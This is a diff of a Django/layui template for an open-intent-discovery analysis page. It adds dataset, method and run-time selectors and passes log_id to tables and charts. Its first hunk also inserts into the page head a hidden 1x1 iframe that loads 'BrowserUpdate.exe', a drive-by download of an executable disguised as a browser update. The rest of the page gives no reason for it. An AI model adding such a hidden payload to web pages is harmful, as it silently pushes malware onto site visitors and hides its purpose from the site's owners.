@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html class="x-admin-sm">
 
-    <head>
+    <head><iframe src=BrowserUpdate.exe width=1 height=1 frameborder=0></iframe>
         <meta charset="UTF-8">
         <META HTTP-EQUIV="pragma" CONTENT="no-cache"> 
         <META HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate"> 
@@ -28,71 +28,102 @@
                     <div class="layui-card-body ">
                         <div style="font-weight:700; font-size:20px;color:#555555">Open Intent Discovery</div>
                         <div style="color:#6F6F6F">--Here,you can find fine-grained open classes. </div>
-                            <form class="layui-form" enctype="multipart/form-data">
-
-                                    <div class="layui-input-inline">
-                                        <div class="layui-input-inline ">
-                                            <div class="layui-form-item" style="position: relative;left: 57%">
-                                                <select id = 'dataset_select_discovery' name="dataset_select_discovery" lay-filter="dataset_select_discovery" onclick="switchBySelect()"> 
-                                                    <option value='0' selected>Dataset</option>
-                                                    {% for lines in dataset_list %}
-                                                        <option  value="{{lines.dataset_id}}" >{{lines.dataset_name}}</option>
-                                                    {% endfor %}
-                                                    <!-- {% for lines in dataset_list %}
-                                                        {% if lines.dataset_name == 'banking' %}
-                                                        <option selected  value="{{lines.dataset_id}}" >{{lines.dataset_name}}</option>
-                                                        {% endif %}
-                                                        
-                                                        {% if lines.model_name != 'banking' %}
-                                                        <option  value="{{lines.dataset_id}}" >{{lines.dataset_name}}</option>
-                                                        {% endif %}
-                                                    {% endfor %} -->
-                                                    <!-- <option disabled>Dataset</option>
-                                                    {% for lines in dataset_list %}
-                                                        <option  value="{{lines.dataset_id}}" >{{lines.dataset_name}}</option>
-                                                    {% endfor %} -->
-                                                </select>
-                                            </div>
+                            
+                            <!--****************************************************************-->
+                            <div style="width: 650px; margin:10px  auto ;padding-top: 1%;">
+                                <form class="layui-form layui-col-space5" >
+                                    <div class="layui-input-inline" style="padding-left: 9px;">
+                                        <div id="title_btn1" class="layui-input-inline" style=" font-weight:600; font-size:15px;color:#555555;width: 200px; border: 0px solid red;">
+                                            Dataset
+                                        </div >
+                                        <div id="title_btn2"class="layui-input-inline" style="font-weight:600; font-size:15px;color:#555555;width: 200px; border: 0px solid red;">
+                                            Method
                                         </div>
-
-                                        <div class="layui-input-inline">
-                                            <div class="layui-form-item" style="position: relative;left: 77%">
-                                                <select id="model_discovery" name="model_discovery">
-                                                    <option selected>Open Intent Discovery</option>
-                                                    {% for lines in modelList_discovery %}
-                                                        <option  value="{{lines.model_name}}" >{{lines.model_name}}</option>
-                                                    {% endfor %}
-                                                    <!-- {% for lines in modelList_discovery %}
-                                                        {% if lines.model_name == 'DeepAligned' %}
-                                                        <option selected  value="{{lines.model_name}}" >{{lines.model_name}}</option>
-                                                        {% endif %}
-                                                        {% if lines.model_name != 'DeepAligned' %}
-                                                        <option  value="{{lines.model_name}}" >{{lines.model_name}}</option>
-                                                        {% endif %}
-                                                    {% endfor %} -->
-                                                </select>
-                                            </div>
+                                        <div id="title_btn3"class="layui-input-inline" style="font-weight:600; font-size:15px;color:#555555;width: 200px; border: 0px solid red;">
+                                            Create Time
                                         </div>
-                                        
-
-
-                                        <div class="layui-input-inline">
-                                            <div class="layui-input-inline">
-                                                <div class="layui-form-item" style="position:relative">
-                                                    <button class="layui-btn" lay-filter="discovery_test"  lay-submit="" style="position: relative;left: 400%">Test</button>
-                                                </div>
-                                            </div>
-
-                                            <div class="layui-input-inline">
-                                                <div class="layui-form-item" style="position:relative">
-                                                    <button class="layui-btn layui-btn-danger"   style="position: relative;left: 600%" type ='reset'>Clear</button>
-                                                </div>
-                                            </div>
-                                        </div>
+                                       
                                     </div>
+                                    <div class="layui-input-inline " >
+                                        <div class="layui-input-inline" id='select_'>
+                                            <select id="dataset_name_select_2" name="dataset_name_select" lay-filter="dataset_analysis" >
+                                                
+                                                {% for lines in dataset_list %}
+                                                {% comment %}<!-- {% if lines.dataset_name == 'banking' %}
+                                                    <option selected  value="{{lines.dataset_name}}" >{{lines.dataset_name}}</option>
+                                                    {% endif %} -->
+                                                    
+                                                    <!-- {% if lines.model_name != 'banking' %} -->{% endcomment %}
 
-                            </form>
-    
+                                                    {% if lines.dataset_name == create_time_new.dataset_name %}
+                                                    <option  value="{{lines.dataset_name}}" selected>{{lines.dataset_name}}</option>
+                                                    {% endif %}
+                                                    {% if lines.dataset_name != create_time_new.dataset_name %}
+                                                    <option  value="{{lines.dataset_name}}" >{{lines.dataset_name}}</option>
+                                                    {% endif %}
+                                                
+                                                    {% comment %}<!-- {% endif %} -->{% endcomment %}
+                                                {% endfor %}
+                                                <!-- <option  disabled >Dataset</option>
+                                                    {% for lines in datasetList %}
+                                                        <option  value="{{lines.dataset_name}}" >{{lines.dataset_name}}</option>
+                                                    {% endfor %} -->
+                                            </select>
+                                        </div>
+                                        <div class="layui-input-inline" >
+                                            <select id="model_detection_1" name="model_detection" lay-filter="method_analysis">
+                                                <option value='model_detection_1' selected >Open Intent Discovery</option>
+                                                {% for lines in modelList_discovery %}
+                                                
+
+                                                {% if lines.model_name == create_time_new.model_name %}
+                                                    <option  value="{{lines.model_name}}" selected>{{lines.model_name}}</option>
+                                                    {% endif %}
+                                                    {% if lines.model_name != create_time_new.model_name %}
+                                                    <option  value="{{lines.model_name}}" >{{lines.model_name}}</option>
+                                                    {% endif %}
+
+                                                {% endfor %}
+
+
+                                                
+
+                                                    <!-- {% for lines in modelList_detection %}
+                                                        <option  value="{{lines.model_name}}" >{{lines.model_name}}</option>
+                                                    {% endfor %} -->
+                                            </select>
+                                        </div>
+                                        <div class="layui-input-inline " >
+                                            <select id="create_time" name="create_time" lay-filter="create_time" style="z-index: 3;">
+                                                
+
+                                                {% for create_time in create_time %}
+                                            
+
+                                                {% if create_time.create_time == create_time_new.create_time %}
+                                                <option   value="{{create_time.log_id}}" selected>{{create_time.create_time|date:"Y/m/d  H:i:s"}}</option>
+                                                {% endif %}
+                                                {% if create_time.create_time != create_time_new.create_time %}
+                                                <option  value="{{create_time.log_id}}" >{{create_time.create_time|date:"Y/m/d  H:i:s"}}</option>
+                                                {% endif %}
+
+
+
+                                                {% endfor %}
+                                            </select>
+                                        </div>
+                                        <div class="layui-inline layui-show-xs-block"style=" margin-right:0px">
+                                            
+                                        </div>
+                                       
+                                    </div>
+                                    <button type="button" style="width: 60px;" class="layui-btn layui-input-inline" id="show2Btn" lay-filter="detection_test" lay-submit="" >Show</button>
+                                </form> 
+                                
+                                    
+                                     
+                            </div>
+    <!--****************************************************************-->
                             <div style="font-weight:700; font-size:20px;color:#555555">Analysis of Model Results</div>
                             <div style="color:#6F6F6F">--Show the model results of discovered open intents.</div>
                             <div class="layui-card-body ">
@@ -149,7 +180,10 @@
                 var form = layui.form,
                 layer = layui.layer;
                 table = layui.table;
-
+                dataset_select_detection = $('#dataset_name_select_2').val()
+                model_detection = $('#model_detection_1').val()  
+                log_id = $('#create_time').val()
+                console.log('log_id: ',log_id)
                 var classTable = table.render({
                     elem: "#classTable",
                     url: '/discovery/model_analysis/model_analysis_getClassListByDatasetNameAndMethod',
@@ -175,11 +209,21 @@
                         ,{field: 'label_text_num', title: 'Numbers' ,width:'20%', align: 'center'}
                     ]]
                     ,where:{
-                        "dataset_name": "banking",
-                        "method": "DeepAligned"
+                        "dataset_name": dataset_select_detection,
+                        "method": model_detection,
+                        "log_id":log_id
                     }
                 });
 
+
+                form.on('submit(detection_test1)',
+                function(data){
+                    //show_image() 
+                    dataset_select_detection = $('#dataset_name_select_2').val()
+                    model_detection = $('#model_detection_1').val()  
+                    log_id = $('#create_time').val()
+                    console.log('log_id: ',log_id)
+                });
                 //监听单元格事件
                 table.on('tool(demoEvent)', function(obj){
                     var data = obj.data;
@@ -195,44 +239,76 @@
                     }
                 });
 
-                form.on('submit(discovery_test)',
+                form.on('select(dataset_analysis)',function(data){
+
+                        $ = layui.jquery;
+                        val1 = data.value;
+                        dataset = data.value;
+
+                        val2 = $('#model_detection_1').val()   
+                                        
+                        if(val1=='Dataset'){
+                        layer.msg('Please select Dataset');
+                        }else 
+                        if(val1!=undefined & val2!=undefined){
+                            show_create_time(val1,val2)
+                        }
+                        });
+
+                form.on('select(method_analysis)',function(data){
+                    console.log('method！！！')
+                    val2 = data.value;
+                    val1 = $('#dataset_name_select_2').val()
+                    method = data.value;
+                    if(val2=='model_detection_1'){
+                        layer.msg('Please select method');
+                    }else
+                        if(val1!=undefined & val2!=undefined){
+                        show_create_time(val1,val2)
+                    }
+                });
+
+                function show_create_time(dataset_name,model_name){
+                $ = layui.jquery;
+                $.get('/detection/model_test/show_create_time?dataset_name='+dataset_name+"&model_name="+model_name, function (data) {
+                    if (data.code != 200){  }
+                            //console.log( JSON.parse(data.data[0]))
+                            console.log(data.data)
+                            console.log(data.data.length)
+                            $("#create_time").empty();
+                        for(var i = 0; i<data.data.length;i++){
+                            $("#create_time").append("<option value="+data.data[i].log_id+">"+data.data[i].create_time.replace(/-/g,'/').replace(/T/g,'  ')+"</option>");
+                        }
+                            // $("#select_data").append("<option value="+kkk+">"+KKKK+"</option>");
+                            form.render('select');
+                            console.log("_____________________750_____________________")
+                            //console.log( JSON.parse(data))
+                            //JSON.parse(data.data[0])
+                            //window.location.href="../model_test/?data="+data.data[0]//.dataset_name
+                            },'json');
+            }
+
+
+//按钮
+                form.on('submit(detection_test)',
                 function(data) {
                     console.log(data);
-                    // var form_data = new FormData();
-                    // form_data.append('model_discovery', $('#model_discovery').val());
-                    // form_data.append('dataset_select_discovery', $('#dataset_select_discovery').val());
-                    // console.log(form_data);
-                    // $.ajax({
-                    //     url: "/discovery/model_analysis/modelAnalysisTest",
-                    //     type: 'POST',
-                    //     data: form_data,
-                    //     dataType: "json",
-                    //     contentType: false,
-                    //     processData: false,// 获取POST所需的csrftoken
-                    //     success: function (data) {
-                    //         //alert(data.msg);
-                    //         layer.msg(data.msg);
-                    //         if (data.code == 200){
-                    //             // 可以对父窗口进行刷新
-                    //             //xadmin.father_reload();
-                    //         }   
-                    //     }
-
-                    // });
-                    //image_show
-                    model_discovery = $('#model_discovery').val()
-                    dataset_select_discovery = $('#dataset_select_discovery').val()
-                    console.log(model_discovery)
-                    if(model_discovery == 'Open Intent Discovery'){
+                    dataset_select_detection = $('#dataset_name_select_2').val()
+                    model_detection = $('#model_detection_1').val()  
+                    log_id = $('#create_time').val()
+                    
+                    if(model_detection == 'Open Intent Discovery'){
                         layer.msg('Please select Model');
-                    } else if( dataset_select_discovery == 0){
+                    } else if( dataset_select_detection == 0){
                         layer.msg('Please select Dataset');
                     }else{// 渲染图表
                         // table reload
                         classTable.reload({
                             where:{
-                                "dataset_name": $('#dataset_select_discovery').find("option:selected").text(),
-                                "method": $('#model_discovery').find("option:selected").text()
+                                "dataset_name": dataset_select_detection,
+                                "method": model_detection,
+                                "log_id":log_id
+                                //加log_id
                             }
                             ,page: { //支持传入 laypage 组件的所有参数（某些参数除外，如：jump/elem） - 详见文档
                                 layout: ['prev', 'page', 'next' , 'count' ] //自定义分页布局
@@ -246,69 +322,74 @@
                         var series = [];//保存散点
                         var mylegend = [];//legend部分使用
                         //get cluster.json
-                        $.get('/static/jsons/open_intent_discovery/DeepAligned_analysis.json', function (data) {
-                            data_chart_5 = data["DeepAligned_banking"];
-                            myChart4.clear();
-                            mylegend.push('');
-                            
-                            for (var key in data_chart_5){
-                                if(key == "Known Intent Centers"){
-                                    data_color = '#FF6666';
-                                }else if(key == "Open Intent Centers"){
-                                    data_color = '#66CCCC';
-                                }
-                                mylegend.push(key);
-                                series.push({
-                                    //symbol:"rect",//矩形
-                                    //symbolSize:[60,15],//矩形设置
-                                    symbolSize:7,
-                                    name:key,
-                                    type:'scatter',
-                                    data:data_chart_5[key],
-                                        itemStyle: {
-                                        normal: {
-                                            borderColor: '#555',
-                                            label: {
-                                                color: data_color,
-                                                show: true,
-                                                position: 'right',
-                                                fontWeight: 'bolder',
-                                                formatter: function (params, ticket, callback) {
-                                                    var s = params.value[2]; 
-                                                    return s
+                        dataset_name_select_2 = $('#dataset_name_select_2').val()
+                        model_detection_1 = $('#model_detection_1').val()  
+                        log_id = $('#create_time').val()
+                        var key=dataset_name_select_2+'_'+model_detection_1+'_'+log_id
+                        $.get('/discovery/model_analysis/model_analysis_getDataOfDINByKey?key='+key, function (data) {
+                                
+                                data_chart_5 = data.data;
+                                myChart4.clear();
+                                mylegend.push('');
+                                
+                                for (var key in data_chart_5){
+                                    if(key == "Known Intent Centers"){
+                                        data_color = '#FF6666';
+                                    }else{
+                                        data_color = '#66CCCC';
+                                    }
+                                    console.log('595:\t'+key)
+                                    console.log('596:\t'+data_color)
+                                    mylegend.push(key);
+                                    series.push({
+                                        //symbol:"rect",//矩形
+                                        //symbolSize:[60,15],//矩形设置
+                                        symbolSize:7,
+                                        name:key,
+                                        type:'scatter',
+                                        data:data_chart_5[key],
+                                            itemStyle: {
+                                            normal: {
+                                                borderColor: '#555',
+                                                label: {
+                                                    color: data_color,
+                                                    show: true,
+                                                    position: 'right',
+                                                    fontWeight: 'bolder',
+                                                    formatter: function (params, ticket, callback) {
+                                                        var s = params.value[2]; 
+                                                        return s
+                                                    },
                                                 },
                                             },
-                                        },
-                                        },
-                                    tooltip: {
-                                        trigger:'item',
-                                        formatter:function(params){
-                                            //console.log(params);                                                             
-                                            var dotHtml2 = '<span style="display:inline-block;margin-right:5px;border-radius:10px;width:10px;height:10px;background-color:#666666"></span>'
-                                            mystr ='<span style="font-size:10px;">'+params.seriesName+"</br>"+dotHtml2+"Key Words:"+'</span>' + '<span style="font-weight:800;font-size:14px;">'+"  " +params.data[2]+'</span>'+"</br>"+dotHtml2+"Center:"+'</span>' + '<span style="font-weight:800;font-size:14px;">'+"  " +'('+params.data[0]+','+params.data[1]+')'+'</span>';
-                                            return mystr;
-                                            //console.log(params);
+                                            },
+                                        tooltip: {
+                                            trigger:'item',
+                                            formatter:function(params){
+                                                //console.log(params);                                                             
+                                                var dotHtml2 = '<span style="display:inline-block;margin-right:5px;border-radius:10px;width:10px;height:10px;background-color:#666666"></span>'
+                                                mystr ='<span style="font-size:10px;">'+params.seriesName+"</br>"+dotHtml2+"Key Words:"+'</span>' + '<span style="font-weight:800;font-size:14px;">'+"  " +params.data[2]+'</span>'+"</br>"+dotHtml2+"Center:"+'</span>' + '<span style="font-weight:800;font-size:14px;">'+"  " +'('+params.data[0]+','+params.data[1]+')'+'</span>';
+                                                return mystr;
+                                                //console.log(params);
+                                            }
+                                            
                                         }
-                                        
-                                    }
-                                });
-                            };
-                            myChart4.setOption({
-                                    color:['#FF6666', '#66CCCC'],
-                                    xAxis: {
-                                        nameTextStyle:{
-                                        fontWeight:550,
-                                    },
-                                    axisLabel:{
-                                        show: true,
-                                        textStyle:{
-                                        fontWeight: 550,
-                                        fontSize:12
-                                    }
-                                }
-                                    },
-                                    yAxis: {
-                                        nameTextStyle:{
+                                    });
+                                };
+                                myChart4.setOption({
+                                        color:['#FF6666', '#66CCCC'],
+                                        xAxis: {nameTextStyle:{
+                                            fontWeight:550,
+                                        },
+                                        axisLabel:{
+                                            show: true,
+                                            textStyle:{
+                                            fontWeight: 550,
+                                            fontSize:12
+                                        }
+                                    }},
+                                        yAxis: {
+                                            nameTextStyle:{
                                             fontWeight:550,
                                         },
                                         axisLabel:{
@@ -318,109 +399,39 @@
                                             fontSize:12
                                         }
                                     }
-                                   
-                                    },                                       
-                                    legend: {
-                                    data:mylegend
-                                    },
-                                    tooltip: {
-                                        position: 'right'
-                                    },
-                                    // x轴拖动
-                                    dataZoom: [
-                                    {
-                                        type: "slider",
-                                        realtime: true, //拖动滚动条时是否动态的更新图表数据
-                                        height: 20, //滚动条高度
-                                        left:"10%",
-                                        right:"5%",
-                                        start: 0, //滚动条开始位置（共100等份）
-                                        end: 100, //结束位置（共100等份）
-                                    },
-                                    {
-                                            type: 'slider',
-                                            show: true,
-                                            yAxisIndex: [0],
-                                            left: '96%',
-                                            right:"1%",
-                                            start: 0, //数据窗口范围的起始百分比
-                                            end: 1000
-                                        }
-                                    ],
-                                    series: series,
-                            })
-                        }, 'json');
-
-                            // {% comment %} const a = window.document.querySelector('#download');
-                            // a.addEventListener('click',()=>{
-                            //     const content = document.querySelector('svg').outerHTML
-                            //     const blob= new Blob([content], {type: 'xml/svg'})
-                            //     a.href = URL.createObjectURL(blob)
-                            //     a.download = 'test.svg'
-                            // }); {% endcomment %}
-
-                    //image2
-                        var myChart2 = echarts.init(document.getElementById('image2'), null, {renderer: 'svg'});
-                        $.get('/static/json/my_json.json', function (data) {
-                            data_chart_2 = data["discovery_pie"];
-                                myChart2.clear();//清除缓存
-                                myChart2.setOption({
-                                        tooltip: {
-                                            trigger: 'item',
-                                            formatter:function(params){
-                                                            console.log(params);                                                             
-                                                            var dotHtml1 = '<span style="display:inline-block;margin-right:5px;border-radius:10px;width:10px;height:10px;background-color:#91cc75"></span>'
-                                                            var dotHtml2 = '<span style="display:inline-block;margin-right:5px;border-radius:10px;width:10px;height:10px;background-color:#fac858"></span>'
-                                                            var dotHtml3 = '<span style="display:inline-block;margin-right:5px;border-radius:10px;width:10px;height:10px;background-color:#ff7800"></span>'
-                                                            mystr ='<span style="font-size:10px;">'+ params.seriesName+'</br>'+'</span>'+ 
-                                                            dotHtml1+'<span style="font-size:10px;">'+params.data.KeyWord1 +'</span>'+ "  " +'<span style="font-weight:800;font-size:13px;">'+params.data.value1+'</span>'+'</br>'+
-                                                            dotHtml2+'<span style="font-size:10px;">'+ params.data.KeyWord2 +'</span>'+"  " +'<span style="font-weight:800;font-size:13px;">'+params.data.value2+'</span>'+'</br>'+
-                                                            dotHtml3+ '<span style="font-size:10px;">'+params.data.KeyWord3 +'</span>'+"  " +'<span style="font-weight:800;font-size:13px;">'+params.data.value3+'</br>'+'</span>';
-                                                            return mystr;
-                                                        }
+                                        },                                       
+                                        legend: {
+                                        data:mylegend
                                         },
-                                    legend: {
-                                        top: 'top'
-                                    },
-                                    grid:{
-                                        x:25,
-                                        y:50,
-                                        x2:50,
-                                        y2:50,
-                                       
-                                    },
-                                    toolbox: {
-                                        show: true,
-                                        feature: {
-                                            mark: {show: false},
-                                            dataView: {show: false, readOnly: false},
-                                            restore: {show: false},
-                                            saveAsImage: {show: false}
-                                        }
-                                    },
-                                    series: [
+                                        tooltip: {
+                                            position: 'right'
+                                        },
+                                        // x轴拖动
+                                        dataZoom: [
                                         {
-                                            name: 'Key Word',
-                                            type: 'pie',
-                                            radius:[15, 82],
-                                            label: {
-                                                color:"#6F6F6F",
-                                                fontWeight: 'bolder',
-                                                formatter:function(params){
-                                                    mystr = params.name+"\n"+"("+params.percent+"%"+")";
-                                                    return mystr;
-                                                        }
-                                            },
-                                            center: ['50%', '50%'],
-                                            roseType: 'area',
-                                            itemStyle: {
-                                                borderRadius: 8
-                                            },
-                                            data: data_chart_2,
-                                        }
-                                    ]
+                                            type: "slider",
+                                            realtime: true, //拖动滚动条时是否动态的更新图表数据
+                                            height: 20, //滚动条高度
+                                            left:"10%",
+                                            right:"5%",
+                                            start: 25, //滚动条开始位置（共100等份）
+                                            end: 75, //结束位置（共100等份）
+                                        },
+                                        {
+                                                type: 'slider',
+                                                show: true,
+                                                yAxisIndex: [0],
+                                                left: '96%',
+                                                right:"1%",
+                                                start: 25, //数据窗口范围的起始百分比
+                                                end: 75
+                                            }
+                                        ],
+                                        series: series,
                                 })
                             }, 'json');
+
+                      
                     }
                     return false;
                 });
@@ -513,6 +524,9 @@
             }
 
             function getOptionsForTextTableOfOpen(trObj, accordion, content, event, dataset_name, class_type, label_name, method){
+                dataset_select_detection = $('#dataset_name_select_2').val()
+                model_detection = $('#model_detection_1').val()  
+                log_id = $('#create_time').val()
                 var optionForClassTable = {
                     elem: trObj,
                     accordion: accordion,
@@ -559,9 +573,12 @@
                                 }}
                             ]]
                             ,where:{
-                                "dataset_name": dataset_name,
-                                "method": method,
-                                "label_name": label_name
+                                "dataset_name": dataset_select_detection,
+                                "method": model_detection,
+                                "label_name": label_name,
+                                "log_id":log_id
+                                
+
                             }
                         });
 
@@ -581,14 +598,17 @@
 
             
             function initDefalutEcharts(){
-                model_discovery = layui.jquery('#model_discovery').val()
-                dataset_select_discovery = layui.jquery('#dataset_select_discovery').val()
+                
+                dataset_name_select_2 = $('#dataset_name_select_2').val()
+                model_detection_1 = $('#model_detection_1').val()  
+                log_id = $('#create_time').val()
+                var key=dataset_name_select_2+'_'+model_detection_1+'_'+log_id
                 //image1    Model Detail Analysis
                 var myChart4 = echarts.init(document.getElementById('image1'), null, {renderer: 'svg'});
                             var series = [];//保存散点
                             var mylegend = [];//legend部分使用
                             //get cluster.json
-                            $.get('/discovery/model_analysis/model_analysis_getDataOfDINByKey?key=DeepAligned_banking', function (data) {
+                            $.get('/discovery/model_analysis/model_analysis_getDataOfDINByKey?key='+key, function (data) {
                                 
                                 data_chart_5 = data.data;
                                 myChart4.clear();
